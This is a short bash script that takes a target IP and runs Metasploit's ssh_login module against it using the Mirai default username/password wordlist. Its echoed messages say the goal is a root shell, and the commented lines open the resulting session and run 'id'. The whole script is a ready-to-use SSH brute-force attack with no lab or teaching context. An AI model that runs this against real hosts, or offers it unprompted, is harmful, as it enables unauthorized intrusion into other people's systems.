#!/bin/bash
echo "Enter rhost ip"
read ip
echo "Bruteforshing ssh on ip address $ip"
echo "Getting root shell using ssh brute force, enter > sessions -1 to get root shell and enter id"
msfconsole -x "use auxiliary/scanner/ssh/ssh_login;\set rhost $ip;\set verbose true;\set stop_on_success true;\set USERPASS_FILE /usr/share/wordlists/metasploit/mirai_user_pass.txt;\run"
echo
#sessions -1

#id
